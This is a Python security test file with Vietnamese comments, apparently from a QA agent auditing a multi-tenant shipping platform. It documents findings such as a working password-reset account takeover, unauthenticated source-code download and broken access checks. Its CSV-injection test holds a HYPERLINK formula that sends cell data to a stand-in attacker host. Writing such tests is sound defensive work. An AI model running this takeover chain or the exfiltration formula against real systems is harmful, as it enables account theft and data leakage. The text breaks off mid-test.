# Bộ soát QA (AG-07) — WAVE 1. Săn lỗ hổng mà ba bộ thử hiện có CHƯA phủ.
#
# Luật của file này:
#   - Mỗi ca thử là MỘT bằng chứng cho MỘT phát hiện. Tên ca mang mã Q-xx của báo cáo.
#   - Ca có tiền tố `test_qXX_LOHONG_` thì ĐANG FAIL LÀ ĐÚNG: nó chứng minh lỗ hổng chưa vá.
#     Khi agent chủ sở hữu vá xong, ca đó phải chuyển sang PASS mà không sửa assert.
#   - Ca có tiền tố `test_qXX_ANTOAN_` thì PASS LÀ ĐÚNG: nó chốt lại một mối lo đã kiểm
#     và kết luận "không phải lỗ hổng", để lần sau không phải soát lại từ đầu.
#   - KHÔNG sửa mã sản phẩm ở đây. QA phát hiện, không vá.
#
# Chạy: python3 app/thu/thu_qa_soat.py
import hashlib
import hmac
import io
import json
import os
import subprocess
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.request

GOC_APP = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GOC_REPO = os.path.dirname(GOC_APP)
sys.path.insert(0, GOC_APP)

_tam = tempfile.mkdtemp(prefix="vip-hub-qa-soat-")
os.environ["VIP_HUB_DATA"] = _tam
os.environ["VIP_HUB_BACKOFF"] = "0.05"
# CỐ Ý không đặt VIP_HUB_RESET_TOKEN: cả bộ này đo hệ thống ở ĐÚNG cấu hình MẶC ĐỊNH.
os.environ.pop("VIP_HUB_RESET_TOKEN", None)

import bao_mat   # noqa: E402
import cau_hinh  # noqa: E402
import csdl      # noqa: E402
import khoi_tao  # noqa: E402
import quyen     # noqa: E402
import server    # noqa: E402
import webhook   # noqa: E402

# Cổng 0 = để hệ tự cấp một cổng RỖI. Cổng cố định làm bộ thử báo HỎNG GIẢ khi hai
# worktree chạy cùng lúc (AG-04 đo được 15/10: `Address already in use` ở lượt đầu,
# chạy lại thì đạt). Cổng thật đọc lại từ `sv.server_address[1]` sau khi bind.
CONG = 0
# Không dựng ở mức module: lúc nạp file vẫn chưa bind nên CONG còn là 0. Hàm thì đọc
# CONG lúc GỌI, nên luôn đúng cổng thật.
def GOC_URL_F():
    return "http://127.0.0.1:%d" % CONG
LOG_SERVER = io.StringIO()
MK = "MatKhauSoat-123"

DON_MAU = {
    "nguoi_gui_ten": "Shop Soát", "nguoi_gui_sdt": "0901111111", "nguoi_gui_dia_chi": "1 Đường Soát, HN",
    "nguoi_nhan_ten": "Khách Soát", "nguoi_nhan_sdt": "0902222222", "nguoi_nhan_dia_chi": "2 Phố Soát, HCM",
    "hang_hoa": "Hộp soát", "khoi_luong_gram": 500, "cod": 150000,
}


class Phien:
    """Client HTTP nhỏ giữ cookie phiên (giống harness của thu_saas.py)."""

    def __init__(self):
        self.cookie = None

    def goi(self, duong, method="GET", du_lieu=None, headers=None, tho=None):
        body = tho if tho is not None else (json.dumps(du_lieu).encode() if du_lieu is not None else None)
        h = dict(headers or {})
        if method in ("POST", "PUT", "DELETE") and "X-Requested-With" not in h:
            h["X-Requested-With"] = "VIPHub"
        if self.cookie:
            h["Cookie"] = self.cookie
        yc = urllib.request.Request(GOC_URL_F() + duong, data=body, headers=h, method=method)
        try:
            with urllib.request.urlopen(yc, timeout=30) as ph:
                sc = ph.headers.get("Set-Cookie")
                if sc:
                    self.cookie = sc.split(";")[0]
                ct = ph.headers.get("Content-Type", "")
                raw = ph.read()
                return ph.status, (json.loads(raw) if "json" in ct else raw)
        except urllib.error.HTTPError as e:
            raw = e.read()
            try:
                return e.code, json.loads(raw)
            except ValueError:
                return e.code, raw

    def dang_nhap(self, ten, mk):
        return self.goi("/api/v2/auth/dang-nhap", "POST", {"ten_dang_nhap": ten, "mat_khau": mk})


def tao_phien(ten, mk):
    p = Phien()
    st, kq = p.dang_nhap(ten, mk)
    assert st == 200, f"đăng nhập {ten} hỏng: {kq}"
    return p


class ThuQaSoat(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        global CONG      # gán lại sau khi bind cổng 0
        cls._stderr_cu = sys.stderr
        sys.stderr = LOG_SERVER
        csdl.mo()
        webhook.khoi_dong()
        cls.sv = server.ThreadingHTTPServer(("127.0.0.1", CONG), server.BoXuLy)
        # Cổng THẬT do hệ cấp — gán lại CONG để mọi chỗ dựng URL lúc chạy tự đúng.
        CONG = cls.sv.server_address[1]
        threading.Thread(target=cls.sv.serve_forever, daemon=True).start()
        quyen.seed()
        khoi_tao.seed_providers()
        csdl.ghi("INSERT INTO schema_version (phien_ban, ap_dung_luc, ghi_chu) VALUES (?,?,'qa-soat')",
                 (csdl.PHIEN_BAN_SCHEMA, csdl.bay_gio()))
        csdl.ghi("INSERT INTO users (ten_dang_nhap, mat_khau_hash, ho_ten, platform_role, tao_luc)"
                 " VALUES ('po', ?, 'Platform Owner', 'PLATFORM_OWNER', ?)",
                 (bao_mat.bam_mat_khau(MK), csdl.bay_gio()))
        # tài khoản riêng để thử khóa/đặt-lại mật khẩu, không dùng 'po' kẻo hỏng các ca khác
        csdl.ghi("INSERT INTO users (ten_dang_nhap, mat_khau_hash, ho_ten, platform_role, tao_luc)"
                 " VALUES ('po2', ?, 'Platform Owner 2', 'PLATFORM_OWNER', ?)",
                 (bao_mat.bam_mat_khau(MK), csdl.bay_gio()))
        csdl.ghi("INSERT INTO users (ten_dang_nhap, mat_khau_hash, ho_ten, platform_role, tao_luc)"
                 " VALUES ('po3', ?, 'Platform Owner 3', 'PLATFORM_OWNER', ?)",
                 (bao_mat.bam_mat_khau(MK), csdl.bay_gio()))
        po = tao_phien("po", MK)
        for ten, dn in (("Tenant A", "a"), ("Tenant B", "b")):
            st, kq = po.goi("/api/v2/platform/tenants", "POST",
                            {"ten": ten, "goi_id": "pro", "owner_ten_dang_nhap": f"{dn}-owner",
                             "owner_mat_khau": MK, "owner_ho_ten": f"Chủ {ten}"})
            assert st == 201, kq
            setattr(cls, "tid_a" if dn == "a" else "tid_b", kq["id"])
        cls.po = po
        cls.a = tao_phien("a-owner", MK)
        cls.b = tao_phien("b-owner", MK)
        st, kq = cls.a.goi("/api/v2/tai-khoan-hang", "POST",
                           {"hang": "vtp", "ten": "VTP của A",
                            "credentials": {"api_key": "soat-key-cua-A-7777"}})
        assert st == 201, kq
        cls.tk_a = kq
        st, kq = cls.b.goi("/api/v2/tai-khoan-hang", "POST",
                           {"hang": "vtp", "ten": "VTP của B",
                            "credentials": {"api_key": "soat-key-cua-B-6666"}})
        assert st == 201, kq
        cls.tk_b = kq
        for ten, role in (("a-staff", "TENANT_STAFF"), ("a-viewer", "TENANT_VIEWER")):
            assert cls.a.goi("/api/v2/memberships", "POST",
                             {"ten_dang_nhap": ten, "mat_khau": MK, "role": role})[0] == 201
        cls.a_staff = tao_phien("a-staff", MK)
        cls.a_viewer = tao_phien("a-viewer", MK)

    @classmethod
    def tearDownClass(cls):
        cls.sv.shutdown()
        cls.sv.server_close()
        webhook.dung()
        csdl.dong()
        sys.stderr = cls._stderr_cu

    def _tao_don(self, phien, **ghi_de):
        d = dict(DON_MAU)
        d.update(ghi_de)
        return phien.goi("/api/v2/don", "POST", d)

    # =========================================================================
    # Q-01 — CRITICAL: token đặt lại mật khẩu trả thẳng qua API ở cấu hình MẶC ĐỊNH
    # =========================================================================
    def test_q01_LOHONG_mac_dinh_khong_duoc_tra_token_reset(self):
        """`cau_hinh.HIEN_TOKEN_RESET` mặc định BẬT (`VIP_HUB_RESET_TOKEN` không đặt → "1").

        Đây là fail-open: quên đặt biến môi trường = lộ. Theo §12.2, cửa nguy hiểm phải
        dùng danh sách TRẮNG (mặc định đóng, phải bật tay), vì bỏ sót một dòng ở đây là HỎNG,
        không phải chỉ mất tiện.

        Đo trong tiến trình con có môi trường sạch để không phụ thuộc env của phiên thử.
        """
        moi_truong = {k: v for k, v in os.environ.items() if k != "VIP_HUB_RESET_TOKEN"}
        ra = subprocess.run(
            [sys.executable, "-I", "-c",
             "import sys; sys.path.insert(0, %r); import cau_hinh; print(cau_hinh.HIEN_TOKEN_RESET)" % GOC_APP],
            capture_output=True, text=True, env=moi_truong, timeout=60)
        self.assertEqual(ra.returncode, 0, ra.stderr)
        self.assertEqual(
            ra.stdout.strip(), "False",
            "HIEN_TOKEN_RESET mặc định BẬT: không đặt VIP_HUB_RESET_TOKEN=0 là API tự trả "
            "token đặt lại mật khẩu. Mặc định phải là TẮT, bật mới là việc của người triển khai.")

    def test_q01b_LOHONG_chiem_tai_khoan_platform_owner_khong_can_dang_nhap(self):
        """Chuỗi chiếm tài khoản đầy đủ, KHÔNG cần bất kỳ thông tin đăng nhập nào.

        Chỉ cần biết TÊN ĐĂNG NHẬP (mà `/api/v2/platform/tenants` ... hoặc đơn giản là đoán
        'admin'/'po'): xin token → đặt lại mật khẩu → đăng nhập bằng quyền PLATFORM_OWNER.
        """
        la = Phien()   # chưa đăng nhập gì cả
        st, kq = la.goi("/api/v2/auth/quen-mat-khau", "POST", {"ten_dang_nhap": "po2"})
        self.assertEqual(st, 200)
        self.assertNotIn(
            "token_gia_lap", kq,
            "API trả token đặt lại mật khẩu cho người gọi KHÔNG đăng nhập → chiếm được "
            "mọi tài khoản chỉ bằng tên đăng nhập. Bằng chứng chuỗi đầy đủ ở phần dưới ca này.")

    def test_q01c_ANTOAN_bang_chung_chuoi_chiem_quyen_chay_duoc_that(self):
        """Ghi lại chuỗi chiếm quyền CHẠY ĐƯỢC THẬT, để không ai nghi ngờ Q-01 là lý thuyết.

        Ca này PASS khi chuỗi tấn công thành công — nó là bằng chứng, không phải cổng chặn.
        Cổng chặn là q01/q01b. Khi Q-01 được vá, ca này sẽ đổi sang chỗ 'khong_the' và PASS tiếp.
        """
        la = Phien()
        st, kq = la.goi("/api/v2/auth/quen-mat-khau", "POST", {"ten_dang_nhap": "po3"})
        self.assertEqual(st, 200)
        if "token_gia_lap" not in kq:
            return  # Q-01 đã vá — chuỗi không còn chạy được, đúng như mong muốn
        st, _ = la.goi("/api/v2/auth/dat-lai-mat-khau", "POST",
                       {"token": kq["token_gia_lap"], "mat_khau_moi": "KeTanCong-9999"})
        self.assertEqual(st, 200, "đặt lại mật khẩu bằng token lấy từ API thất bại")
        p = Phien()
        st, _ = p.dang_nhap("po3", "KeTanCong-9999")
        self.assertEqual(st, 200, "đăng nhập bằng mật khẩu vừa đặt thất bại")
        st, kq = p.goi("/api/v2/auth/toi")
        self.assertEqual(kq["platform_role"], "PLATFORM_OWNER",
                         "chuỗi chiếm quyền đã vào tới vai trò PLATFORM_OWNER")

    # =========================================================================
    # Q-02 — HIGH: bộ phục vụ static trả về MÃ NGUỒN cho người chưa đăng nhập
    # =========================================================================
    def test_q02_LOHONG_khong_duoc_phuc_vu_ma_nguon_python(self):
        """`_phuc_vu_tinh` chạy TRƯỚC mọi lớp xác thực và dùng danh sách ĐEN
        (`..`, `app/du-lieu`, `gateway/du-lieu`, `.git`) thay vì danh sách TRẮNG.

        Chú thích đầu `server.py` nói chỉ phục vụ `admin/`, `pages/`, `assets/` — nhưng mã
        phục vụ MỌI file trong repo. Đây đúng ca §12.2: cho dữ liệu ĐI RA thì quên một dòng
        trong danh sách đen là mất im lặng, nên chỗ này phải là danh sách trắng.
        """
        la = Phien()
        lo = []
        for duong in ("/app/server.py", "/app/bao_mat.py", "/app/cau_hinh.py",
                      "/gateway/cau_hinh.py", "/app/thu/thu_saas.py"):
            st, raw = la.goi(duong)
            if st == 200:
                lo.append(duong)
        self.assertEqual(
            lo, [], f"người CHƯA đăng nhập tải được mã nguồn: {lo}. "
                    "gateway/cau_hinh.py còn chứa cả secret HMAC/token demo của 5 hãng.")

    def test_q02b_ANTOAN_khoa_ma_hoa_va_git_khong_tai_duoc(self):
        """Mối lo liền kề đã kiểm: khóa AES và .git CÓ nằm trong danh sách đen → chặn được.

        Nhưng nó chặn được nhờ đúng hai dòng hằng chuỗi `app/du-lieu` / `.git`. Đổi
        `VIP_HUB_DATA` sang thư mục khác trong repo là danh sách đen hết tác dụng —
        ghi ra đây để Q-02 được vá bằng danh sách trắng, không phải bằng cách thêm dòng đen.
        """
        la = Phien()
        for duong in ("/app/du-lieu/khoa-noi-bo.key", "/app/du-lieu/hub.db", "/.git/config"):
            st, _ = la.goi(duong)
            self.assertNotEqual(st, 200, f"{duong} tải được!")

    # =========================================================================
    # Q-03 — MEDIUM: hai đường /api/v2/platform/* KHÔNG gọi self._can()
    # =========================================================================
    def test_q03_LOHONG_platform_goi_va_vai_tro_thieu_kiem_quyen(self):
        """`/api/v2/platform/goi` và `/api/v2/platform/vai-tro` là hai đường duy nhất trong
        `_api_platform` không gọi `self._can(...)`.

        Hệ quả: TENANT_VIEWER của một doanh nghiệp đọc được bảng giá nội bộ và TOÀN BỘ ma trận
        RBAC (roles + permissions + role_permissions) của nền tảng. Không có quyền
        `platform.*` nào trong vai trò của họ, nhưng vẫn vào được.
        """
        st, kq = self.a_viewer.goi("/api/v2/platform/vai-tro")
        self.assertEqual(
            st, 403,
            f"TENANT_VIEWER đọc được ma trận RBAC nền tảng (HTTP {st}): "
            f"{len(kq.get('role_permissions', []))} dòng role_permissions, "
            f"{len(kq.get('permissions', []))} quyền. Thiếu self._can() ở server.py.")

    def test_q03b_LOHONG_platform_goi_thieu_kiem_quyen(self):
        """Cùng gốc với Q-03, tách ra để vá xong là thấy ngay cả hai đường đã kín."""
        st, kq = self.a_viewer.goi("/api/v2/platform/goi")
        self.assertEqual(st, 403,
                         f"TENANT_VIEWER đọc được bảng gói/giá nền tảng (HTTP {st}): {kq}")

    def test_q03c_ANTOAN_moi_duong_platform_con_lai_deu_co_can(self):
        """Đã kiểm — không phải lỗ hổng: mọi đường platform khác đều chặn TENANT_VIEWER."""
        for duong, method in (("/api/v2/platform/tenants", "GET"),
                              ("/api/v2/platform/audit", "GET")):
            st, _ = self.a_viewer.goi(duong, method)
            self.assertEqual(st, 403, f"{method} {duong} không chặn TENANT_VIEWER")
        st, _ = self.a_viewer.goi("/api/v2/platform/tenants", "POST",
                                  {"ten": "Cướp", "owner_ten_dang_nhap": "x", "owner_mat_khau": MK * 2})
        self.assertEqual(st, 403, "TENANT_VIEWER tạo được tenant!")

    # =========================================================================
    # Q-04 — LOW: 404-vs-403 làm máy dò sự tồn tại của tenant
    # =========================================================================
    def test_q04_LOHONG_khong_duoc_de_lo_tenant_nao_ton_tai(self):
        """Trong `_api_platform`, hai nhánh `/platform/tenants/{id}` và
        `/platform/tenants/{id}/{khoa|mo|goi}` tra CSDL xem tenant có tồn tại TRƯỚC khi gọi
        `_can`. Người không có quyền nhận 404 cho id không tồn tại và 403 cho id có thật
        → đếm được số doanh nghiệp trên nền tảng và dò id hợp lệ.

        Thứ tự đúng: AUTHORIZE trước, rồi mới tra đối tượng.
        """
        st_co, _ = self.a_viewer.goi(f"/api/v2/platform/tenants/{self.tid_b}")
        st_khong, _ = self.a_viewer.goi("/api/v2/platform/tenants/999999")
        self.assertEqual(
            st_co, st_khong,
            f"rò rỉ sự tồn tại: tenant có thật → {st_co}, tenant không có → {st_khong}. "
            "Người gọi không có quyền phải nhận CÙNG một mã.")

    # =========================================================================
    # Q-05 — MEDIUM: tham số gioi_han âm phá vỡ chặn LIMIT
    # =========================================================================
    def test_q05_LOHONG_gioi_han_am_lam_limit_vo_hieu(self):
        """`min(int(ts.get("gioi_han","100")), 500)` chỉ chặn ĐẦU TRÊN. `gioi_han=-1` cho
        `LIMIT -1`, mà trong SQLite `LIMIT -1` nghĩa là KHÔNG giới hạn → một yêu cầu kéo hết
        bảng đơn của doanh nghiệp. Không phải chéo tenant, nhưng là đường làm kiệt bộ nhớ/CPU
        và vượt mức chặn 500 mà chính mã đặt ra.
        """
        for _ in range(7):
            self._tao_don(self.a)
        st, kq = self.a.goi("/api/v2/don?gioi_han=-1")
        self.assertEqual(st, 200)
        st2, kq2 = self.a.goi("/api/v2/don?gioi_han=3")
        self.assertEqual(st2, 200)
        self.assertLessEqual(
            len(kq["don"]), len(kq2["don"]),
            f"gioi_han=-1 trả {len(kq['don'])} đơn (LIMIT -1 = không giới hạn), "
            f"trong khi gioi_han=3 trả {len(kq2['don'])}. Thiếu chặn đầu dưới (max(1, ...)).")

    def test_q05b_LOHONG_gioi_han_khong_phai_so_thanh_loi_500(self):
        """`int(ts["gioi_han"])` ném ValueError → lọt vào nhánh `except Exception` chung và
        trả 500. Dữ liệu người dùng sai phải là 400, không được thành lỗi hệ thống: 500 làm
        nhiễu cảnh báo vận hành và che lỗi thật.
        """
        st, _ = self.a.goi("/api/v2/don?gioi_han=abc")
        self.assertEqual(st, 400, f"gioi_han không phải số trả HTTP {st}, phải là 400")

    def test_q05c_LOHONG_truong_so_trong_body_ai_thanh_loi_500(self):
        """Cùng một họ với Q-05b, ở `ai_gateway`: `int(don.get("cod") or 0)` không bọc try."""
        st, _ = self.a.goi("/api/v2/ai/phat-hien-bat-thuong", "POST", {"cod": "rất nhiều"})
        self.assertEqual(st, 400, f"cod không phải số trả HTTP {st}, phải là 400")

    # =========================================================================
    # Q-06 — MEDIUM: khóa tài khoản vĩnh viễn từ xa, không cần đăng nhập
    # =========================================================================
    def test_q06_LOHONG_khoa_tai_khoan_tu_xa_khong_co_duong_tu_mo(self):
        """`dang_nhap` khóa tài khoản sau `KHOA_SAU_SO_LAN_SAI=5` lần sai, KHÔNG có chặn theo
        IP, không có cửa sổ thời gian, không tự mở lại. Và `dat_lai_mat_khau` chỉ xóa
        `so_lan_sai`, KHÔNG xóa `trang_thai='khoa'`.

        Hệ quả: 5 yêu cầu HTTP vô danh khóa vĩnh viễn một tài khoản bất kỳ — kể cả
        PLATFORM_OWNER cuối cùng — và chính chủ không tự mở lại được bằng 'quên mật khẩu'.
        """
        csdl.ghi("INSERT INTO users (ten_dang_nhap, mat_khau_hash, ho_ten, platform_role, tao_luc)"
                 " VALUES ('nan-nhan', ?, 'Nạn nhân', 'PLATFORM_OWNER', ?)",
                 (bao_mat.bam_mat_khau(MK), csdl.bay_gio()))
        for _ in range(cau_hinh.KHOA_SAU_SO_LAN_SAI):
            Phien().dang_nhap("nan-nhan", "sai-mat-khau-hoan-toan")
        u = csdl.mot("SELECT trang_thai FROM users WHERE ten_dang_nhap='nan-nhan'")
        if u["trang_thai"] != "khoa":
            return  # đã có chặn theo IP / cửa sổ thời gian → lỗ hổng đã vá
        # chính chủ thử tự khôi phục bằng luồng quên mật khẩu
        la = Phien()
        st, kq = la.goi("/api/v2/auth/quen-mat-khau", "POST", {"ten_dang_nhap": "nan-nhan"})
        tk = kq.get("token_gia_lap")
        if tk:
            la.goi("/api/v2/auth/dat-lai-mat-khau", "POST",
                   {"token": tk, "mat_khau_moi": "MatKhauKhacHoanToan-1"})
            st, _ = Phien().dang_nhap("nan-nhan", "MatKhauKhacHoanToan-1")
            self.assertEqual(
                st, 200,
                "tài khoản bị người lạ khóa bằng 5 lần đăng nhập sai, và đặt lại mật khẩu "
                "KHÔNG mở khóa → mất tài khoản vĩnh viễn, chỉ ai còn quyền quản trị mới mở được. "
                "Cần chặn theo IP/thời gian ở dang_nhap, hoặc khóa có hạn.")
        else:
            self.fail("tài khoản bị khóa từ xa và không có đường tự mở lại")

    # =========================================================================
    # Q-07 — MEDIUM: import không chặn số dòng, duyệt không chặn độ dài danh sách
    # =========================================================================
    def test_q07_LOHONG_import_khong_chan_so_dong(self):
        """`_doc_body` cho tới 20 MB, `nhap_file.tao_batch` chèn MỘT dòng CSDL cho MỖI dòng
        file, không có mức chặn nào. Một file CSV hợp lệ 20 MB ≈ hàng trăm nghìn dòng → vòng
        lặp ghi không chặn, giữ `khoa_ghi` và làm đứng mọi phiên khác.

        Ca này chỉ nạp 20.000 dòng (đủ chứng minh không có mức chặn, vẫn chạy nhanh).
        """
        import base64
        so_dong = 20_000
        dau = "recipient_name,recipient_phone,recipient_address,product_name,weight_grams\n"
        than = "".join(f"Khach {i},0903333333,{i} Pho Soat,Hop,500\n" for i in range(so_dong))
        noi_dung = base64.b64encode((dau + than).encode()).decode()
        st, kq = self.a.goi("/api/v2/import", "POST",
                            {"ten_file": "khong-chan.csv", "noi_dung_base64": noi_dung})
        self.assertEqual(
            st, 413,
            f"nạp {so_dong} dòng trong một yêu cầu được nhận (HTTP {st}) — không có mức chặn "
            "số dòng/kích thước cho endpoint import. Cần chặn số dòng và trả 413.")

    def test_q07b_LOHONG_duyet_batch_khong_chan_do_dai_dong_ids(self):
        """`duyet_batch` lặp qua `dong_ids` của client, mỗi phần tử một truy vấn CSDL, không
        chặn độ dài. Gửi 50.000 id (dù toàn id rác) là 50.000 truy vấn cho một yêu cầu.
        """
        import base64
        csv = ("recipient_name,recipient_phone,recipient_address,product_name,weight_grams\n"
               "Khach Soat,0903333333,9 Pho Soat,Hop,500\n")
        st, kq = self.a.goi("/api/v2/import", "POST",
                            {"ten_file": "nho.csv",
                             "noi_dung_base64": base64.b64encode(csv.encode()).decode()})
        self.assertEqual(st, 201, kq)
        batch_id = kq["batch_id"]
        st, kq = self.a.goi(f"/api/v2/import/{batch_id}/duyet", "POST",
                            {"nguoi_gui": {"ten": "Shop", "sdt": "0901111111", "dia_chi": "1 HN"},
                             "dong_ids": list(range(900000, 950000))})
        self.assertEqual(
            st, 400,
            f"gửi 50.000 dong_ids được xử (HTTP {st}, kết quả {kq}) — không chặn độ dài danh "
            "sách do client cấp. Cần chặn (ví dụ ≤ 1000) và trả 400.")

    def test_q07c_LOHONG_body_lon_truoc_khi_xac_thuc(self):
        """`_doc_body(gioi_han=20MB)` áp cho MỌI endpoint, kể cả `/auth/dang-nhap` (vô danh)
        và `/webhook/nhan/{ma}` (đọc hết body TRƯỚC khi kiểm chữ ký HMAC).

        Nghĩa là người chưa có tài khoản đẩy được 20 MB mỗi yêu cầu vào tiến trình. Ca này
        dùng 4 MB để chạy nhanh — nó đo "có mức chặn hợp lý cho đường vô danh hay không",
        không đo đúng con số 20 MB.
        """
        rac = "x" * (4 * 1024 * 1024)
        st, _ = Phien().goi("/api/v2/auth/dang-nhap", "POST",
                            {"ten_dang_nhap": "po", "mat_khau": rac})
        self.assertEqual(
            st, 413,
            f"body 4 MB tới endpoint đăng nhập vô danh được nhận (HTTP {st}). Đường vô danh "
            "cần mức chặn riêng, nhỏ (ví dụ 64 KB), không dùng chung 20 MB với import.")

    # =========================================================================
    # Q-08 — LOW: tiêm công thức vào CSV xuất ra
    # =========================================================================
    def test_q08_LOHONG_tiem_cong_thuc_vao_csv_xuat_ra(self):
        """`/api/v2/don/xuat-csv` bọc nháy kép nhưng KHÔNG vô hiệu hóa ký tự mở đầu công thức
        (`=`, `+`, `-`, `@`, tab, CR). Tên người nhận do client/file import cấp, nên một
        doanh nghiệp tự ghi `=HYPERLINK(...)` vào đơn của mình rồi gửi file cho người khác mở
        bằng Excel/Sheets là chạy công thức trên máy người đọc.

        Mức LOW vì phải có người mở file bằng bảng tính, nhưng xuất CSV là tính năng dành
        đúng cho việc đó.
        """
        doc = '=HYPERLINK("http://ke-tan-cong.test?r="&A1,"bang-luong")'
        st, kq = self._tao_don(self.a, nguoi_nhan_ten=doc)
        self.assertEqual(st, 201, kq)
        st, raw = self.a.goi("/api/v2/don/xuat-csv")
        self.assertEqual(st, 200)
        van_ban = raw.decode() if isinstance(raw, bytes) else json.dumps(raw)
        self.assertNotIn(
            '"=HYPERLINK', van_ban,
            "ô CSV bắt đầu bằng '=' được xuất nguyên văn → bảng tính sẽ chạy nó. "
            "Cần thêm tiền tố vô hiệu (nháy đơn) cho ô bắt đầu bằng = + - @ tab CR.")

    # =========================================================================
    # Q-09 — đã kiểm, KHÔNG phải lỗ hổng: cách ly tenant trên các đường chưa có ca thử
    # =========================================================================
    def test_q09_ANTOAN_sua_dong_import_cheo_tenant_bi_chan(self):
        """`nhap_file.sua_dong` nối sang `import_batch` để lấy tenant rồi so — kín.
        Trước ca này chưa có bộ thử nào bắn `/api/v2/import/dong/{id}` chéo tenant.
        """
        import base64
        csv = ("recipient_name,recipient_phone,recipient_address,product_name,weight_grams\n"
               "Khach A,0903333333,1 Pho A,Hop,500\n")
        st, kq = self.a.goi("/api/v2/import", "POST",
                            {"ten_file": "cua-a.csv",
                             "noi_dung_base64": base64.b64encode(csv.encode()).decode()})
        self.assertEqual(st, 201, kq)
        st, kq = self.a.goi(f"/api/v2/import/{kq['batch_id']}")
        dong_id = kq["dong"][0]["id"]
        st, _ = self.b.goi(f"/api/v2/import/dong/{dong_id}", "PUT", {"nguoi_nhan_ten": "Của B?"})
        self.assertEqual(st, 404, "tenant B sửa được dòng import của A!")
        st, _ = self.b.goi(f"/api/v2/import/{kq['batch']['id']}")
        self.assertEqual(st, 404, "tenant B đọc được batch import của A!")

    def test_q09b_ANTOAN_duyet_batch_khong_nhan_dong_cua_batch_khac(self):
        """`duyet_batch` lọc `WHERE id=? AND batch_id=?` → id dòng của batch khác bị bỏ qua.
        Kiểm cả trường hợp batch khác thuộc TENANT khác.
        """
        import base64
        csv = ("recipient_name,recipient_phone,recipient_address,product_name,weight_grams\n"
               "Khach B,0903333333,1 Pho B,Hop,500\n")
        st, kq = self.b.goi("/api/v2/import", "POST",
                            {"ten_file": "cua-b.csv",
                             "noi_dung_base64": base64.b64encode(csv.encode()).decode()})
        self.assertEqual(st, 201, kq)
        b_batch = kq["batch_id"]
        st, kq = self.b.goi(f"/api/v2/import/{b_batch}")
        b_dong = kq["dong"][0]["id"]
        st, kq = self.a.goi("/api/v2/import", "POST",
                            {"ten_file": "cua-a2.csv",
                             "noi_dung_base64": base64.b64encode(csv.encode()).decode()})
        a_batch = kq["batch_id"]
        st, kq = self.a.goi(f"/api/v2/import/{a_batch}/duyet", "POST",
                            {"nguoi_gui": {"ten": "Shop A", "sdt": "0901111111", "dia_chi": "1 HN"},
                             "dong_ids": [b_dong]})
        self.assertEqual(st, 200, kq)
        self.assertEqual(kq["SUCCESS"], 0, "A duyệt được dòng import của B thành đơn!")
        self.assertEqual(kq["bo_qua"], 1)
        d = csdl.mot("SELECT trang_thai, don_id FROM import_dong WHERE id=?", (b_dong,))
        self.assertIsNone(d["don_id"], "dòng của B bị A gắn đơn!")

    def test_q09c_ANTOAN_webhook_khong_cap_nhat_don_cua_tenant_khac(self):
        """Mã vận đơn TRÙNG NHAU ở hai tenant: webhook của B không được đụng đơn của A.

        `webhook._xu_ly` giải quyết đơn bằng `ma_van_don + tenant_id + carrier_account_id`
        lấy từ account trên URL, không lấy từ payload → kín. Bộ thử cũ (test_08) chỉ kiểm
        trường hợp mã vận đơn KHÔNG tồn tại ở tenant kia; ca này kiểm trường hợp khó hơn:
        mã vận đơn tồn tại ở CẢ HAI tenant.
        """
        ma_vd = "SOAT-TRUNG-MVD-0001"
        ids = {}
        for nhan, phien, tk in (("a", self.a, self.tk_a), ("b", self.b, self.tk_b)):
            st, kq = self._tao_don(phien)
            self.assertEqual(st, 201, kq)
            don_id = kq["don"]["id"]
            csdl.ghi("UPDATE don_hang SET trang_thai='da_gui', ma_van_don=?, carrier_account_id=?,"
                     " trang_thai_giao='cho_lay', hang_trang_thai_giao=1 WHERE id=?",
                     (ma_vd, tk["id"], don_id))
            ids[nhan] = don_id
        body = json.dumps({"event_id": "soat-cheo-1", "event": "giao_thanh_cong",
                           "tracking_number": ma_vd}).encode()
        sig = hmac.new(self.tk_b["webhook_secret_mot_lan"].encode(), body, hashlib.sha256).hexdigest()
        st, _ = Phien().goi(f"/api/v2/webhook/nhan/{self.tk_b['webhook_ma']}", "POST", tho=body,
                            headers={"X-Webhook-Signature": sig, "Content-Type": "application/json"})
        self.assertIn(st, (200, 202))
        self.assertTrue(webhook.cho_rong(10))
        da = csdl.mot("SELECT trang_thai_giao FROM don_hang WHERE id=?", (ids["a"],))
        db = csdl.mot("SELECT trang_thai_giao FROM don_hang WHERE id=?", (ids["b"],))
        self.assertEqual(db["trang_thai_giao"], "giao_thanh_cong", "đơn của B không được cập nhật")
        self.assertEqual(da["trang_thai_giao"], "cho_lay",
                         "webhook của B đã cập nhật đơn của A dù trùng mã vận đơn!")

    def test_q09d_ANTOAN_webhook_bat_buoc_chu_ky_khong_co_duong_vong(self):
        """Không có đường nào vào `/api/v2/webhook/nhan/{ma}` mà bỏ qua HMAC: thiếu header,
        header rỗng, sai secret, và secret của account khác đều bị chặn 401.
        """
        body = json.dumps({"event_id": "soat-ky-1", "event": "lay_hang",
                           "tracking_number": "KHONG-CO"}).encode()
        sai_secret = hmac.new(self.tk_a["webhook_secret_mot_lan"].encode(), body,
                              hashlib.sha256).hexdigest()
        for nhan, h in (("thiếu header", {}),
                        ("header rỗng", {"X-Webhook-Signature": ""}),
                        ("chữ ký rác", {"X-Webhook-Signature": "deadbeef"}),
                        ("secret của account khác", {"X-Webhook-Signature": sai_secret})):
            st, _ = Phien().goi(f"/api/v2/webhook/nhan/{self.tk_b['webhook_ma']}", "POST",
                                tho=body, headers=dict(h, **{"Content-Type": "application/json"}))
            self.assertEqual(st, 401, f"webhook nhận được payload với {nhan}!")

    def test_q09e_ANTOAN_thu_hoi_quyen_co_hieu_luc_ngay_khong_cache(self):
        """`bao_mat.ngu_canh()` tra lại CSDL mỗi yêu cầu, không cache NguCanh.

        Kiểm bằng yêu cầu LIỀN NHAU trên CÙNG một cookie: hạ vai trò STAFF → VIEWER thì
        yêu cầu ghi tiếp theo phải 403 ngay, không cần đăng nhập lại.
        """
        st, _ = self._tao_don(self.a_staff)
        self.assertEqual(st, 201, "staff chưa tạo được đơn — tiền đề của ca này sai")
        mem = csdl.mot("SELECT m.id FROM tenant_memberships m JOIN users u ON u.id=m.user_id"
                       " WHERE u.ten_dang_nhap='a-staff'")
        st, _ = self.a.goi(f"/api/v2/memberships/{mem['id']}", "PUT", {"role": "TENANT_VIEWER"})
        self.assertEqual(st, 200)
